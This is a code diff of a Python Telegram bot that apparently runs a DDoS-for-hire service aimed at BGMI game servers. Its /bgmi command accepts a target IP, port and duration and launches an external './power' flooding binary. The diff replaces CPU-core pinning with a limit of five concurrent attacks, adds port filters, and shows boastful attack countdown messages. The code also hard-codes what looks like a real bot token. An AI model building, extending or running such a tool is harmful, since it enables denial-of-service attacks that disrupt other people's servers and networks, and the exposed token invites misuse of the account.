@@ -23,18 +23,6 @@ OWNER_ID = "6442837812"
 bot = telebot.TeleBot('7507720145:AAGwwmsLkfpNS0LlTbfVfIDKZXPUalZEDwE')
 
 # ----------------------
-# Global variables for CPU core assignment (for 4 vCPUs)
-# ----------------------
-cpu_lock = threading.Lock()
-available_cores = [0, 1, 2, 3]  # 4 vCPUs available
-
-def release_cpu(attack_info):
-    if 'cpu' in attack_info:
-        with cpu_lock:
-            if attack_info['cpu'] not in available_cores:
-                available_cores.append(attack_info['cpu'])
-
-# ----------------------
 # Data Persistence Setup
 # ----------------------
 SUB_ADMINS = set()       # Sub-admin user IDs
@@ -75,13 +63,6 @@ atexit.register(save_persistent_data)
 # ----------------------
 # Attack Persistence
 # ----------------------
-def send_final_message(attack):
-    with attacks_lock:
-        if attack in active_attacks:
-            active_attacks.remove(attack)
-    save_active_attacks()
-    release_cpu(attack)
-
 def load_active_attacks():
     global active_attacks
     try:
@@ -104,11 +85,16 @@ def save_active_attacks():
             'target': a['target'],
             'port': a['port'],
             'end_time': a['end_time'].isoformat(),
-            'message_id': a.get('message_id'),
-            'cpu': a.get('cpu')
+            'message_id': a.get('message_id')
         } for a in active_attacks]
     with open('active_attacks.json', 'w') as f:
         json.dump(attacks_to_save, f)
+
+def send_final_message(attack):
+    with attacks_lock:
+        if attack in active_attacks:
+            active_attacks.remove(attack)
+    save_active_attacks()
 
 # ----------------------
 # Asynchronous Event Loop Setup
@@ -193,10 +179,10 @@ async def async_update_countdown(message, msg_id, start_time, duration, caller_i
         if remaining <= 0:
             break
         try:
-            await loop.run_in_executor(None, lambda: bot.edit_message_text(
+            await loop.run_in_executor(None, lambda: bot.edit_message_caption(
                 chat_id=message.chat.id,
                 message_id=msg_id,
-                text=f"""
+                caption=f"""
 ⚡️🔥 𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐄𝐏𝐋𝐎𝐘𝐄𝐃 🔥⚡️
 
 👑 **Commander**: `{caller_id}`
@@ -212,10 +198,10 @@ async def async_update_countdown(message, msg_id, start_time, duration, caller_i
             logging.error(f"Async countdown update error: {e}")
         await asyncio.sleep(1)
     try:
-        await loop.run_in_executor(None, lambda: bot.edit_message_text(
+        await loop.run_in_executor(None, lambda: bot.edit_message_caption(
             chat_id=message.chat.id,
             message_id=msg_id,
-            text=f"""
+            caption=f"""
 ✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 ✅**
 🎯 **Target**: `{target}`
 📡 **Port**: `{port}`
@@ -230,7 +216,6 @@ async def async_update_countdown(message, msg_id, start_time, duration, caller_i
         if attack_info in active_attacks:
             active_attacks.remove(attack_info)
     save_active_attacks()
-    release_cpu(attack_info)
 
 # ---------------------------
 # All Original Commands
@@ -249,8 +234,8 @@ def start_command(message):
     🚀 Use `/help` to see the available commands and get started!
     
     🛡️ For assistance, contact [@wtf_vai]
-    🛡️ For assistance, contact [@skyline_offficial]
-
+    🛡️ For assistance, contact [@its_darinda]
+    
     **Note:** Unauthorized access is prohibited. Contact an admin if you need access.
     """
     bot.reply_to(message, welcome_message, parse_mode='Markdown')
@@ -265,6 +250,7 @@ def handle_bgmi(message):
         if caller_id not in user_access or user_access[caller_id] < datetime.datetime.now():
             bot.reply_to(message, "❌ You are not authorized to use this bot or your access has expired. Please contact an admin.")
             return
+    # For admins (owner or sub-admins), bypass the user_access check.
     if is_rate_limited(caller_id):
         bot.reply_to(message, "🚨 Too many requests!")
         return
@@ -279,46 +265,44 @@ def handle_bgmi(message):
     if not port.isdigit() or not (1 <= int(port) <= 65535):
         bot.reply_to(message, "❌ Invalid port! Please provide a port number between 1 and 65535.")
         return
+
+    # Blocked ports check
+    int_port = int(port)
+    BLOCKED_PORTS = {17000, 17500, 20000, 20001, 20002}
+    if int_port <= 10000 or int_port >= 30000 or int_port in BLOCKED_PORTS:
+        bot.reply_to(message, f"🚫 The port `{int_port}` is blocked! Please use a different port.")
+        return
+
     if duration > MAX_ATTACK_DURATION:
         bot.reply_to(message, f"⚠️ Maximum attack duration is {MAX_ATTACK_DURATION} seconds.")
         return
     if caller_id in attack_limits and duration > attack_limits[caller_id]:
         bot.reply_to(message, f"⚠️ Your maximum allowed attack duration is {attack_limits[caller_id]} seconds.")
         return
-    # Remove the old check for 1 concurrent attack and use CPU core availability instead.
-    with cpu_lock:
-        if not available_cores:
-            bot.reply_to(message, "🚨 All CPU cores are currently in use. Please wait for an attack to finish.")
-            return
-        assigned_core = available_cores.pop(0)
+    current_active = [attack for attack in active_attacks if attack['end_time'] > datetime.datetime.now()]
+    if len(current_active) >= 5:
+        bot.reply_to(message, "🚨 Maximum of 5 concurrent attacks allowed. Please wait for the current attack to finish before launching a new one.")
+        return
     attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=duration)
-    attack_info = {
-        'user_id': caller_id,
-        'target': target,
-        'port': port,
-        'end_time': attack_end_time,
-        'cpu': assigned_core
-    }
+    attack_info = {'user_id': caller_id, 'target': target, 'port': int_port, 'end_time': attack_end_time}
     
     try:
         subprocess.Popen(
-            ["taskset", "-c", str(assigned_core), "./power", target, str(port), str(duration)],
+            ["./power", target, str(int_port), str(duration)],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
     except Exception as e:
         logging.error(f"Subprocess error: {e}")
         bot.reply_to(message, "🚨 An error occurred while executing the attack command.")
-        with cpu_lock:
-            available_cores.append(assigned_core)
         return
 
     with attacks_lock:
         active_attacks.append(attack_info)
     save_active_attacks()
-    log_attack(caller_id, target, port, duration)
+    log_attack(caller_id, target, int_port, duration)
     
-    # Using send_animation to send the attack deployed message with the chosen GIF
+    # Send initial attack message as an animated GIF with caption
     msg = bot.send_animation(
         message.chat.id,
         animation="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjR3ZHI1YnQ1bHU4OHBqN2I2M3N2eDVpdG8wNndjaDVvNXoyZDB3aSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/SsBz0oSJ1botYaLqAR/giphy.gif",
@@ -327,7 +311,7 @@ def handle_bgmi(message):
 
 👑 **Commander**: `{caller_id}`
 🎯 **Target Locked**: `{target}`
-📡 **Port Engaged**: `{port}`
+📡 **Port Engaged**: `{int_port}`
 ⏳ **Time Remaining**: `{duration} seconds`
 ⚔️ **Weapon**: `BGMI Protocol`
 🔥 **The wrath is unleashed. May the network shatter!** 🔥
@@ -337,7 +321,7 @@ def handle_bgmi(message):
     attack_info['message_id'] = msg.message_id
     save_active_attacks()
     asyncio.run_coroutine_threadsafe(
-        async_update_countdown(message, msg.message_id, datetime.datetime.now(), duration, caller_id, target, port, attack_info),
+        async_update_countdown(message, msg.message_id, datetime.datetime.now(), duration, caller_id, target, int_port, attack_info),
         async_loop
     )
 
@@ -391,6 +375,9 @@ def help_command(message):
         logging.error(f"Telegram API error: {e}")
         bot.reply_to(message, "🚨 An error occurred while processing your request. Please try again later.")
 
+# ---------------------------
+# Admin Commands (Owner and Sub-admins)
+# ---------------------------
 @bot.message_handler(commands=['grant'])
 @allowed_chat_only
 def grant_command(message):
